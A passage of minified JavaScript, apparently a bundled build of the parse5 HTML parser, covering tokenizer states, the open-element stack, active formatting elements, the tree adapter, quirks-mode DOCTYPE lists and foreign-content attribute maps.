z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.unexpectedCharacterAfterDoctypeSystemIdentifier),this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateBogusDoctype(e){const t=this.currentToken;switch(e){case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.NULL:{this._err(pe.unexpectedNullCharacter);break}case z.EOF:{this.emitCurrentDoctype(t),this._emitEOFToken();break}}}_stateCdataSection(e){switch(e){case z.RIGHT_SQUARE_BRACKET:{this.state=H.CDATA_SECTION_BRACKET;break}case z.EOF:{this._err(pe.eofInCdata),this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateCdataSectionBracket(e){e===z.RIGHT_SQUARE_BRACKET?this.state=H.CDATA_SECTION_END:(this._emitChars("]"),this.state=H.CDATA_SECTION,this._stateCdataSection(e))}_stateCdataSectionEnd(e){switch(e){case z.GREATER_THAN_SIGN:{this.state=H.DATA;break}case z.RIGHT_SQUARE_BRACKET:{this._emitChars("]");break}default:this._emitChars("]]"),this.state=H.CDATA_SECTION,this._stateCdataSection(e)}}_stateCharacterReference(){let e=this.entityDecoder.write(this.preprocessor.html,this.preprocessor.pos);if(e<0)if(this.preprocessor.lastChunkWritten)e=this.entityDecoder.end();else{this.active=!1,this.preprocessor.pos=this.preprocessor.html.length-1,this.consumedAfterSnapshot=0,this.preprocessor.endOfChunkHit=!0;return}e===0?(this.preprocessor.pos=this.entityStartPos,this._flushCodePointConsumedAsCharacterReference(z.AMPERSAND),this.state=!this._isCharacterReferenceInAttribute()&&mL(this.preprocessor.peek(1))?H.AMBIGUOUS_AMPERSAND:this.returnState):this.state=this.returnState}_stateAmbiguousAmpersand(e){mL(e)?this._flushCodePointConsumedAsCharacterReference(e):(e===z.SEMICOLON&&this._err(pe.unknownNamedCharacterReference),this.state=this.returnState,this._callState(e))}}const ZM=new Set([S.DD,S.DT,S.LI,S.OPTGROUP,S.OPTION,S.P,S.RB,S.RP,S.RT,S.RTC]),hL=new Set([...ZM,S.CAPTION,S.COLGROUP,S.TBODY,S.TD,S.TFOOT,S.TH,S.THEAD,S.TR]),Mh=new Set([S.APPLET,S.CAPTION,S.HTML,S.MARQUEE,S.OBJECT,S.TABLE,S.TD,S.TEMPLATE,S.TH]),x$=new Set([...Mh,S.OL,S.UL]),A$=new Set([...Mh,S.BUTTON]),gL=new Set([S.ANNOTATION_XML,S.MI,S.MN,S.MO,S.MS,S.MTEXT]),bL=new Set([S.DESC,S.FOREIGN_OBJECT,S.TITLE]),P$=new Set([S.TR,S.TEMPLATE,S.HTML]),L$=new Set([S.TBODY,S.TFOOT,S.THEAD,S.TEMPLATE,S.HTML]),R$=new Set([S.TABLE,S.TEMPLATE,S.HTML]),I$=new Set([S.TD,S.TH]);class w${get currentTmplContentOrNode(){return this._isInTemplate()?this.treeAdapter.getTemplateContent(this.current):this.current}constructor(e,t,n){this.treeAdapter=t,this.handler=n,this.items=[],this.tagIDs=[],this.stackTop=-1,this.tmplCount=0,this.currentTagId=S.UNKNOWN,this.current=e}_indexOf(e){return this.items.lastIndexOf(e,this.stackTop)}_isInTemplate(){return this.currentTagId===S.TEMPLATE&&this.treeAdapter.getNamespaceURI(this.current)===Ce.HTML}_updateCurrentElement(){this.current=this.items[this.stackTop],this.currentTagId=this.tagIDs[this.stackTop]}push(e,t){this.stackTop++,this.items[this.stackTop]=e,this.current=e,this.tagIDs[this.stackTop]=t,this.currentTagId=t,this._isInTemplate()&&this.tmplCount++,this.handler.onItemPush(e,t,!0)}pop(){const e=this.current;this.tmplCount>0&&this._isInTemplate()&&this.tmplCount--,this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(e,!0)}replace(e,t){const n=this._indexOf(e);this.items[n]=t,n===this.stackTop&&(this.current=t)}insertAfter(e,t,n){const i=this._indexOf(e)+1;this.items.splice(i,0,t),this.tagIDs.splice(i,0,n),this.stackTop++,i===this.stackTop&&this._updateCurrentElement(),this.current&&this.currentTagId!==void 0&&this.handler.onItemPush(this.current,this.currentTagId,i===this.stackTop)}popUntilTagNamePopped(e){let t=this.stackTop+1;do t=this.tagIDs.lastIndexOf(e,t-1);while(t>0&&this.treeAdapter.getNamespaceURI(this.items[t])!==Ce.HTML);this.shortenToLength(Math.max(t,0))}shortenToLength(e){for(;this.stackTop>=e;){const t=this.current;this.tmplCount>0&&this._isInTemplate()&&(this.tmplCount-=1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(t,this.stackTop<e)}}popUntilElementPopped(e){const t=this._indexOf(e);this.shortenToLength(Math.max(t,0))}popUntilPopped(e,t){const n=this._indexOfTagNames(e,t);this.shortenToLength(Math.max(n,0))}popUntilNumberedHeaderPopped(){this.popUntilPopped(k0,Ce.HTML)}popUntilTableCellPopped(){this.popUntilPopped(I$,Ce.HTML)}popAllUpToHtmlElement(){this.tmplCount=0,this.shortenToLength(1)}_indexOfTagNames(e,t){for(let n=this.stackTop;n>=0;n--)if(e.has(this.tagIDs[n])&&this.treeAdapter.getNamespaceURI(this.items[n])===t)return n;return-1}clearBackTo(e,t){const n=this._indexOfTagNames(e,t);this.shortenToLength(n+1)}clearBackToTableContext(){this.clearBackTo(R$,Ce.HTML)}clearBackToTableBodyContext(){this.clearBackTo(L$,Ce.HTML)}clearBackToTableRowContext(){this.clearBackTo(P$,Ce.HTML)}remove(e){const t=this._indexOf(e);t>=0&&(t===this.stackTop?this.pop():(this.items.splice(t,1),this.tagIDs.splice(t,1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(e,!1)))}tryPeekProperlyNestedBodyElement(){return this.stackTop>=1&&this.tagIDs[1]===S.BODY?this.items[1]:null}contains(e){return this._indexOf(e)>-1}getCommonAncestor(e){const t=this._indexOf(e)-1;return t>=0?this.items[t]:null}isRootHtmlElementCurrent(){return this.stackTop===0&&this.tagIDs[0]===S.HTML}hasInDynamicScope(e,t){for(let n=this.stackTop;n>=0;n--){const i=this.tagIDs[n];switch(this.treeAdapter.getNamespaceURI(this.items[n])){case Ce.HTML:{if(i===e)return!0;if(t.has(i))return!1;break}case Ce.SVG:{if(bL.has(i))return!1;break}case Ce.MATHML:{if(gL.has(i))return!1;break}}}return!0}hasInScope(e){return this.hasInDynamicScope(e,Mh)}hasInListItemScope(e){return this.hasInDynamicScope(e,x$)}hasInButtonScope(e){return this.hasInDynamicScope(e,A$)}hasNumberedHeaderInScope(){for(let e=this.stackTop;e>=0;e--){const t=this.tagIDs[e];switch(this.treeAdapter.getNamespaceURI(this.items[e])){case Ce.HTML:{if(k0.has(t))return!0;if(Mh.has(t))return!1;break}case Ce.SVG:{if(bL.has(t))return!1;break}case Ce.MATHML:{if(gL.has(t))return!1;break}}}return!0}hasInTableScope(e){for(let t=this.stackTop;t>=0;t--)if(this.treeAdapter.getNamespaceURI(this.items[t])===Ce.HTML)switch(this.tagIDs[t]){case e:return!0;case S.TABLE:case S.HTML:return!1}return!0}hasTableBodyContextInTableScope(){for(let e=this.stackTop;e>=0;e--)if(this.treeAdapter.getNamespaceURI(this.items[e])===Ce.HTML)switch(this.tagIDs[e]){case S.TBODY:case S.THEAD:case S.TFOOT:return!0;case S.TABLE:case S.HTML:return!1}return!0}hasInSelectScope(e){for(let t=this.stackTop;t>=0;t--)if(this.treeAdapter.getNamespaceURI(this.items[t])===Ce.HTML)switch(this.tagIDs[t]){case e:return!0;case S.OPTION:case S.OPTGROUP:break;default:return!1}return!0}generateImpliedEndTags(){for(;this.currentTagId!==void 0&&ZM.has(this.currentTagId);)this.pop()}generateImpliedEndTagsThoroughly(){for(;this.currentTagId!==void 0&&hL.has(this.currentTagId);)this.pop()}generateImpliedEndTagsWithExclusion(e){for(;this.currentTagId!==void 0&&this.currentTagId!==e&&hL.has(this.currentTagId);)this.pop()}}const yy=3;var ao;(function(a){a[a.Marker=0]="Marker",a[a.Element=1]="Element"})(ao||(ao={}));const vL={type:ao.Marker};class j${constructor(e){this.treeAdapter=e,this.entries=[],this.bookmark=null}_getNoahArkConditionCandidates(e,t){const n=[],i=t.length,r=this.treeAdapter.getTagName(e),l=this.treeAdapter.getNamespaceURI(e);for(let u=0;u<this.entries.length;u++){const d=this.entries[u];if(d.type===ao.Marker)break;const{element:p}=d;if(this.treeAdapter.getTagName(p)===r&&this.treeAdapter.getNamespaceURI(p)===l){const f=this.treeAdapter.getAttrList(p);f.length===i&&n.push({idx:u,attrs:f})}}return n}_ensureNoahArkCondition(e){if(this.entries.length<yy)return;const t=this.treeAdapter.getAttrList(e),n=this._getNoahArkConditionCandidates(e,t);if(n.length<yy)return;const i=new Map(t.map(l=>[l.name,l.value]));let r=0;for(let l=0;l<n.length;l++){const u=n[l];u.attrs.every(d=>i.get(d.name)===d.value)&&(r+=1,r>=yy&&this.entries.splice(u.idx,1))}}insertMarker(){this.entries.unshift(vL)}pushElement(e,t){this._ensureNoahArkCondition(e),this.entries.unshift({type:ao.Element,element:e,token:t})}insertElementAfterBookmark(e,t){const n=this.entries.indexOf(this.bookmark);this.entries.splice(n,0,{type:ao.Element,element:e,token:t})}removeEntry(e){const t=this.entries.indexOf(e);t!==-1&&this.entries.splice(t,1)}clearToLastMarker(){const e=this.entries.indexOf(vL);e===-1?this.entries.length=0:this.entries.splice(0,e+1)}getElementEntryInScopeWithTagName(e){const t=this.entries.find(n=>n.type===ao.Marker||this.treeAdapter.getTagName(n.element)===e);return t&&t.type===ao.Element?t:null}getElementEntry(e){return this.entries.find(t=>t.type===ao.Element&&t.element===e)}}const ks={createDocument(){return{nodeName:"#document",mode:Kn.NO_QUIRKS,childNodes:[]}},createDocumentFragment(){return{nodeName:"#document-fragment",childNodes:[]}},createElement(a,e,t){return{nodeName:a,tagName:a,attrs:t,namespaceURI:e,childNodes:[],parentNode:null}},createCommentNode(a){return{nodeName:"#comment",data:a,parentNode:null}},createTextNode(a){return{nodeName:"#text",value:a,parentNode:null}},appendChild(a,e){a.childNodes.push(e),e.parentNode=a},insertBefore(a,e,t){const n=a.childNodes.indexOf(t);a.childNodes.splice(n,0,e),e.parentNode=a},setTemplateContent(a,e){a.content=e},getTemplateContent(a){return a.content},setDocumentType(a,e,t,n){const i=a.childNodes.find(r=>r.nodeName==="#documentType");if(i)i.name=e,i.publicId=t,i.systemId=n;else{const r={nodeName:"#documentType",name:e,publicId:t,systemId:n,parentNode:null};ks.appendChild(a,r)}},setDocumentMode(a,e){a.mode=e},getDocumentMode(a){return a.mode},detachNode(a){if(a.parentNode){const e=a.parentNode.childNodes.indexOf(a);a.parentNode.childNodes.splice(e,1),a.parentNode=null}},insertText(a,e){if(a.childNodes.length>0){const t=a.childNodes[a.childNodes.length-1];if(ks.isTextNode(t)){t.value+=e;return}}ks.appendChild(a,ks.createTextNode(e))},insertTextBefore(a,e,t){const n=a.childNodes[a.childNodes.indexOf(t)-1];n&&ks.isTextNode(n)?n.value+=e:ks.insertBefore(a,ks.createTextNode(e),t)},adoptAttributes(a,e){const t=new Set(a.attrs.map(n=>n.name));for(let n=0;n<e.length;n++)t.has(e[n].name)||a.attrs.push(e[n])},getFirstChild(a){return a.childNodes[0]},getChildNodes(a){return a.childNodes},getParentNode(a){return a.parentNode},getAttrList(a){return a.attrs},getTagName(a){return a.tagName},getNamespaceURI(a){return a.namespaceURI},getTextNodeContent(a){return a.value},getCommentNodeContent(a){return a.data},getDocumentTypeNodeName(a){return a.name},getDocumentTypeNodePublicId(a){return a.publicId},getDocumentTypeNodeSystemId(a){return a.systemId},isTextNode(a){return a.nodeName==="#text"},isCommentNode(a){return a.nodeName==="#comment"},isDocumentTypeNode(a){return a.nodeName==="#documentType"},isElementNode(a){return Object.prototype.hasOwnProperty.call(a,"tagName")},setNodeSourceCodeLocation(a,e){a.sourceCodeLocation=e},getNodeSourceCodeLocation(a){return a.sourceCodeLocation},updateNodeSourceCodeLocation(a,e){a.sourceCodeLocation={...a.sourceCodeLocation,...e}}},eN="html",D$="about:legacy-compat",M$="http://www.ibm.com/data/dtd/v11/ibmxhtml1-transitional.dtd",aN=["+//silmaril//dtd html pro v0r11 19970101//","-//as//dtd html 3.0 aswedit + extensions//","-//advasoft ltd//dtd html 3.0 aswedit + extensions//","-//ietf//dtd html 2.0 level 1//","-//ietf//dtd html 2.0 level 2//","-//ietf//dtd html 2.0 strict level 1//","-//ietf//dtd html 2.0 strict level 2//","-//ietf//dtd html 2.0 strict//","-//ietf//dtd html 2.0//","-//ietf//dtd html 2.1e//","-//ietf//dtd html 3.0//","-//ietf//dtd html 3.2 final//","-//ietf//dtd html 3.2//","-//ietf//dtd html 3//","-//ietf//dtd html level 0//","-//ietf//dtd html level 1//","-//ietf//dtd html level 2//","-//ietf//dtd html level 3//","-//ietf//dtd html strict level 0//","-//ietf//dtd html strict level 1//","-//ietf//dtd html strict level 2//","-//ietf//dtd html strict level 3//","-//ietf//dtd html strict//","-//ietf//dtd html//","-//metrius//dtd metrius presentational//","-//microsoft//dtd internet explorer 2.0 html strict//","-//microsoft//dtd internet explorer 2.0 html//","-//microsoft//dtd internet explorer 2.0 tables//","-//microsoft//dtd internet explorer 3.0 html strict//","-//microsoft//dtd internet explorer 3.0 html//","-//microsoft//dtd internet explorer 3.0 tables//","-//netscape comm. corp.//dtd html//","-//netscape comm. corp.//dtd strict html//","-//o'reilly and associates//dtd html 2.0//","-//o'reilly and associates//dtd html extended 1.0//","-//o'reilly and associates//dtd html extended relaxed 1.0//","-//sq//dtd html 2.0 hotmetal + extensions//","-//softquad software//dtd hotmetal pro 6.0::19990601::extensions to html 4.0//","-//softquad//dtd hotmetal pro 4.0::19971010::extensions to html 4.0//","-//spyglass//dtd html 2.0 extended//","-//sun microsystems corp.//dtd hotjava html//","-//sun microsystems corp.//dtd hotjava strict html//","-//w3c//dtd html 3 1995-03-24//","-//w3c//dtd html 3.2 draft//","-//w3c//dtd html 3.2 final//","-//w3c//dtd html 3.2//","-//w3c//dtd html 3.2s draft//","-//w3c//dtd html 4.0 frameset//","-//w3c//dtd html 4.0 transitional//","-//w3c//dtd html experimental 19960712//","-//w3c//dtd html experimental 970421//","-//w3c//dtd w3 html//","-//w3o//dtd w3 html 3.0//","-//webtechs//dtd mozilla html 2.0//","-//webtechs//dtd mozilla html//"],N$=[...aN,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"],_$=new Set(["-//w3o//dtd w3 html strict 3.0//en//","-/w3c/dtd html 4.0 transitional/en","html"]),tN=["-//w3c//dtd xhtml 1.0 frameset//","-//w3c//dtd xhtml 1.0 transitional//"],q$=[...tN,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"];function yL(a,e){return e.some(t=>a.startsWith(t))}function k$(a){return a.name===eN&&a.publicId===null&&(a.systemId===null||a.systemId===D$)}function O$(a){if(a.name!==eN)return Kn.QUIRKS;const{systemId:e}=a;if(e&&e.toLowerCase()===M$)return Kn.QUIRKS;let{publicId:t}=a;if(t!==null){if(t=t.toLowerCase(),_$.has(t))return Kn.QUIRKS;let n=e===null?N$:aN;if(yL(t,n))return Kn.QUIRKS;if(n=e===null?tN:q$,yL(t,n))return Kn.LIMITED_QUIRKS}return Kn.NO_QUIRKS}const EL={TEXT_HTML:"text/html",APPLICATION_XML:"application/xhtml+xml"},U$="definitionurl",z$="definitionURL",B$=new Map(["attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(a=>[a.toLowerCase(),a])),F$=new Map([["xlink:actuate",{prefix:"xlink",name:"actuate",namespace:Ce.XLINK}],["xlink:arcrole",{prefix:"xlink",name:"arcrole",namespace:Ce.XLINK}],["xlink:href",{prefix:"xlink",name:"href",namespace:Ce.XLINK}],["xlink:role",{prefix:"xlink",name:"role",namespace:Ce.XLINK}],["xlink:show",{prefix:"xlink",name:"show",namespace:Ce.XLINK}],["xlink:title",{prefix:"xlink",name:"title",namespace:Ce.XLINK}],["xlink:type",{prefix:"xlink",name:"type",namespace:Ce.XLINK}],["xml:lang",{prefix:"xml",name:"lang",namespace:Ce.XML}],["xml:space",{prefix:"xml",name:"space",namespace:Ce.XML}],["xmlns",{prefix:"",name:"xmlns",namespace:Ce.XMLNS}],["xmlns:xlink",{prefix:"xmlns",name:"xlink",namespace:Ce.XMLNS}]]),V$=new Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(a=>[a.toLowerCase(),a])),H$=new Set([S.B,S.BIG,S.BLOCKQUOTE,S.BODY,S.BR,S.CENTER,S.CODE,S.DD,S.DIV,S.DL,S.DT,S.EM,S.EMBED,S.H1,S.H2,S.H3,S.H4,S.H5,S.H6,S.HEAD,S.HR,S.I,S.IMG,S.LI,S.LISTING,S.MENU,S.META,S.NOBR,S.OL,S.P,S.PRE,S.RUBY,S.S,S.SMALL,S.SPAN,S.STRONG,S.STRIKE,S.SUB,S.SUP,S.TABLE,S.TT,S.U,S.UL,S.VAR]);function G$(a){const e=a.tagID;return e===S.FONT&&a.attrs.some(({name:n})=>n===el.COLOR||n===el.SIZE||n===el.FACE)||H$.has(e)}function nN(a){for(let e=0;e<a.attrs.length;e++)if(a.attrs[e].name===U$){a.attrs[e].name=z$;break}}function iN(a){for(let e=0;e<a.attrs.length;e++){const t=B$.get(a.attrs[e].name);t!=null&&(a.attrs[e].name=t)}}function Z1(a){for(let e=0;e<a.attrs.length;e++){const t=F$.get(a.attrs[e].name);t&&(a.attrs[e].prefix=t.prefix,a.attrs[e].name=t.name,a.attrs[e].namespace=t.namespace)}}function Q$(a){const e=V$.get(a.tagName);e!=null&&(a.tagName=e,a.tagID=eu(a.tagName))}function J$(a,e){return e===Ce.MATHML&&(a===S.MI||a===S.MO||a===S.MN||a===S.MS||a===S.MTEXT)}function W$(a,e,t){if(e===Ce.MATHML&&a===S.ANNOTATION_XML){for(let n=0;n<t.length;n++)if(t[n].name===el.ENCODING){const i=t[n].value.toLowerCase();return i===EL.TEXT_HTML||i===EL.APPLICATION_XML}}return e===Ce.SVG&&(a===S.FOREIGN_OBJECT||a===S.DESC||a===S.TITLE)}function K$(a,e,t,n){return(!n||n===Ce.HTML)&&W$(a,e,t)||(!n||n===Ce.MATHML)&&J$(a,e)}const Y$="hidden",$$=8,X$=3;var W;(function(a){a[a.INITIAL=0]="INITIAL",a[a.BEFORE_HTML=1]="BEFORE_HTML",a[a.BEFORE_HEAD=2]="BEFORE_HEAD",a[a.IN_HEAD=3]="IN_HEAD",a[a.IN_HEAD_NO_SCRIPT=4]="IN_HEAD_NO_SCRIPT",a[a.AFTER_HEAD=5]="AFTER_HEAD",a[a.IN_BODY=6]="IN_BODY",a[a.TEXT=7]="TEXT",a[a.IN_TABLE=8]="IN_TABLE",a[a.IN_TABLE_TEXT=9]="IN_TABLE_TEXT",a[a.IN_CAPTION=10]="IN_CAPTION",a[a.IN_COLUMN_GROUP=11]="IN_COLUMN_GROUP",a[a.IN_TABLE_BODY=12]="IN_TABLE_BODY",a[a.IN_ROW=13]="IN_ROW",a[a.IN_CELL=14]="IN_CELL",a[a.IN_SELECT=15]="IN_SELECT",a[a.IN_SELECT_IN_TABLE=16]="IN_SELECT_IN_TABLE",a[a.IN_TEMPLATE=17]="IN_TEMPLATE",a[a.AFTER_BODY=18]="AFTER_BODY",a[a.IN_FRAMESET=19]="IN_FRAMESET",a[a.AFTER_FRAMESET=20]="AFTER_FRAMESET",a[a.AFTER_AFTER_BODY=21]="AFTER_AFTER_BODY",a[a.AFTER_AFTER_FRAMESET=22]="AFTER_AFTER_FRAMESET"})(W||(W={}));const Z$={startLine:-1,startCol:-1,startOffset:-1,endLine:-1,endCol:-1,endOffset:-1},oN=new Set([S.TABLE,S.TBODY,S.TFOOT,S.THEAD,S.TR]),SL={scriptingEnabled:!0,sourceCodeLocationInfo:!1,treeAdapter:ks,onParseError:null};class CL{constructor(e,t,n=null,i=null){this.fragmentContext=n,this.scriptHandler=i,this.currentToken=null,this.stopped=!1,this.insertionMode=W.INITIAL,this.originalInsertionMode=W.INITIAL,this.headElement=null,this.formElement=null,this.currentNotInHTML=!1,this.tmplInsertionModeStack=[],this.pendingCharacterTokens=[],this.hasNonWhitespacePendingCharacterToken=!1,this.framesetOk=!0,this.skipNextNewLine=!1,this.fosterParentingEnabled=!1,this.options={...SL,...e},this.treeAdapter=this.options.treeAdapter,this.onParseError=this.options.onParseError,this.onParseError&&(this.options.sourceCodeLocationInfo=!0),this.document=t??this.treeAdapter.createDocument(),this.tokenizer=new T$(this.options,this),this.activeFormattingElements=new j$(this.treeAdapter),this.fragmentContextID=n?eu(this.treeAdapter.getTagName(n)):S.UNKNOWN,this._setContextModes(n??this.document,this.fragmentContextID),this.openElements=new w$(this.document,this.treeAdapter,this)}static parse(e,t){const n=new this(t);return n.tokenizer.write(e,!0),n.document}static getFragmentParser(e,t){const n={...SL,...t};e??(e=n.treeAdapter.createElement(ne.TEMPLATE,Ce.HTML,[]));const i=n.treeAdapter.createElement("documentmock",Ce.HTML,[]),r=new this(n,i,e);return r.fragmentContextID===S.TEMPLATE&&r.tmplInsertionModeStack.unshift(W.IN_TEMPLATE),r._initTokenizerForFragmentParsing(),r._insertFakeRootElement(),r._resetInsertionMode(),r._findFormInFragmentContext(),r}getFragment(){const e=this.treeAdapter.getFirstChild(this.document),t=this.treeAdapter.createDocumentFragment();return this._adoptNodes(e,t),t}_err(e,t,n){var i;if(!this.onParseError)return;const r=(i=e.location)!==null&&i!==void 0?i:Z$,l={code:t,startLine:r.startLine,startCol:r.startCol,startOffset:r.startOffset,endLine:n?r.startLine:r.endLine,endCol:n?r.startCol:r.endCol,endOffset:n?r.startOffset:r.endOffset};this.onParseError(l)}onItemPush(e,t,n){var i,r;(r=(i=this.treeAdapter).onItemPush)===null||r===void 0||r.call(i,e),n&&this.openElements.stackTop>0&&this._setContextModes(e,t)}onItemPop(e,t){var n,i;if(this.options.sourceCodeLocationInfo&&this._setEndLocation(e,this.currentToken),(i=(n=this.treeAdapter).onItemPop)===null||i===void 0||i.call(n,e,this.openElements.current),t){let r,l;this.openElements.stackTop===0&&this.fragmentContext?(r=this.fragmentContext,l=this.fragmentContextID):{current:r,currentTagId:l}=this.openElements,this._setContextModes(r,l)}}_setContextModes(e,t){const n=e===this.document||e&&this.treeAdapter.getNamespaceURI(e)===Ce.HTML;this.currentNotInHTML=!n,this.tokenizer.inForeignNode=!n&&e!==void 0&&t!==void 0&&!this._isIntegrationPoint(t,e)}_switchToTextParsing(e,t){this._insertElement(e,Ce.HTML),this.tokenizer.state=t,this.originalInsertionMode=this.insertionMode,this.insertionMode=W.TEXT}switchToPlaintextParsing(){this.insertionMode=W.TEXT,this.originalInsertionMode=W.IN_BODY,this.tokenizer.state=tt.PLAINTEXT}_getAdjustedCurrentElement(){return this.openElements.stackTop===0&&this.fragmentContext?this.fragmentContext:this.openElements.current}_findFormInFragmentContext(){let e=this.fragmentContext;for(;e;){if(this.treeAdapter.getTagName(e)===ne.FORM){this.formElement=e;break}e=this.treeAdapter.getParentNode(e)}}_initTokenizerForFragmentParsing(){if(!(!this.fragmentContext||this.treeAdapter.getNamespaceURI(this.fragmentContext)!==Ce.HTML))switch(this.fragmentContextID){case S.TITLE:case S.TEXTAREA:{this.tokenizer.state=tt.RCDATA;break}case S.STYLE:case S.XMP:case S.IFRAME:case S.NOEMBED:case S.NOFRAMES:case S.NOSCRIPT:{this.tokenizer.state=tt.RAWTEXT;break}case S.SCRIPT:{this.tokenizer.state=tt.SCRIPT_DATA;break}case S.PLAINTEXT:{this.tokenizer.state=tt.PLAINTEXT;break}}}_setDocumentType(e){const t=e.name||"",n=e.publicId||"",i=e.systemId||"";if(this.treeAdapter.setDocumentType(this.document,t,n,i),e.location){const l=this.treeAdapter.getChildNodes(this.document).find(u=>this.treeAdapter.isDocumentTypeNode(u));l&&this.treeAdapter.setNodeSourceCodeLocation(l,e.location)}}_attachElementToTree(e,t){if(this.options.sourceCodeLocationInfo){const n=t&&{...t,startTag:t};this.treeAdapter.setNodeSourceCodeLocation(e,n)}if(this._shouldFosterParentOnInsertion())this._fosterParentElement(e);else{const n=this.openElements.currentTmplContentOrNode;this.treeAdapter.appendChild(n??this.document,e)}}_appendElement(e,t){const n=this.treeAdapter.createElement(e.tagName,t,e.attrs);this._attachElementToTree(n,e.location)}_insertElement(e,t){const n=this.treeAdapter.createElement(e.tagName,t,e.attrs);this._attachElementToTree(n,e.location),this.openElements.push(n,e.tagID)}_insertFakeElement(e,t){const n=this.treeAdapter.createElement(e,Ce.HTML,[]);this._attachElementToTree(n,null),this.openElements.push(n,t)}_insertTemplate(e){const t=this.treeAdapter.createElement(e.tagName,Ce.HTML,e.attrs),n=this.treeAdapter.createDocumentFragment();this.treeAdapter.setTemplateContent(t,n),this._attachElementToTree(t,e.location),this.openElements.push(t,e.tagID),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(n,null)}_insertFakeRootElement(){const e=this.treeAdapter.createElement(ne.HTML,Ce.HTML,[]);this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(e,null),this.treeAdapter.appendChild(this.openElements.current,e),this.openElements.push(e,S.HTML)}_appendCommentNode(e,t){const n=this.treeAdapter.createCommentNode(e.data);this.treeAdapter.appendChild(t,n),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(n,e.location)}_insertCharacters(e){let t,n;if(this._shouldFosterParentOnInsertion()?({parent:t,beforeElement:n}=this._findFosterParentingLocation(),n?this.treeAdapter.insertTextBefore(t,e.chars,n):this.treeAdapter.insertText(t,e.chars)):(t=this.openElements.currentTmplContentOrNode,this.treeAdapter.insertText(t,e.chars)),!e.location)return;const i=this.treeAdapter.getChildNodes(t),r=n?i.lastIndexOf(n):i.length,l=i[r-1];if(this.treeAdapter.getNodeSourceCodeLocation(l)){const{endLine:d,endCol:p,endOffset:f}=e.location;this.treeAdapter.updateNodeSourceCodeLocation(l,{endLine:d,endCol:p,endOffset:f})}else this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(l,e.location)}_adoptNodes(e,t){for(let n=this.treeAdapter.getFirstChild(e);n;n=this.treeAdapter.getFirstChild(e))this.treeAdapter.detachNode(n),this.treeAdapter.appendChild(t,n)}_setEndLocation(e,t){if(this.treeAdapter.getNodeSourceCodeLocation(e)&&t.location){const n=t.location,i=this.treeAdapter.getTagName(e),r=t.type===na.END_TAG&&i===t.tagName?{endTag:{...n},endLine:n.endLine,endCol:n.endCol,endOffset:n.endOffset}:{endLine:n.startLine,endCol:n.startCol,endOffset:n.startOffset};this.treeAdapter.updateNodeSourceCodeLocation(e,r)}}shouldProcessStartTagTokenInForeignContent(e){if(!this.currentNotInHTML)return!1;let t,n;return this.openElements.stackTop===0&&this.fragmentContext?(t=this.fragmentContext,n=this.fragmentContextID):{current:t,currentTagId:n}=this.openElements,e.tagID===S.SVG&&this.treeAdapter.getTagName(t)===ne.ANNOTATION_XML&&this.treeAdapter.getNamespaceURI(t)===Ce.MATHML?!1:this.tokenizer.inForeignNode||(e.tagID===S.MGLYPH||e.tagID===S.MALIGNMARK)&&n!==void 0&&!this._isIntegrationPoint(n,t,Ce.HTML)}_processToken(e){switch(e.type){case na.CHARACTER:{this.onCharacter(e);break}case na.NULL_CHARACTER:{this.onNullCharacter(e);break}case na.COMMENT:{this.onComment(e);break}case na.DOCTYPE:{this.onDoctype(e);break}case na.START_TAG:{this._processStartTag(e);break}case na.END_TAG:{this.onEndTag(e);break}case na.EOF:{this.onEof(e);break}case na.WHITESPACE_CHARACTER:{this.onWhitespaceCharacter(e);break}}}_isIntegrationPoint(e,t,n){const i=this.treeAdapter.getNamespaceURI(t),r=this.treeAdapter.getAttrList(t);return K$(e,i,r,n)}_reconstructActiveFormattingElements(){const e=this.activeFormattingElements.entries.length;if(e){const t=this.activeFormattingElements.entries.findIndex(i=>i.type===ao.Marker||this.openElements.contains(i.element)),n=t===-1?e-1:t-1;for(let i=n;i>=0;i--){const r=this.activeFormattingElements.entries[i];this._insertElement(r.token,this.treeAdapter.getNamespaceURI(r.element)),r.element=this.openElements.current}}}_closeTableCell(){this.openElements.generateImpliedEndTags(),this.openElements.popUntilTableCellPopped(),this.activeFormattingElements.clearToLastMarker(),this.insertionMode=W.IN_ROW}_closePElement(){this.openElements.generateImpliedEndTagsWithExclusion(S.P),this.openElements.popUntilTagNamePopped(S.P)}_resetInsertionMode(){for(let 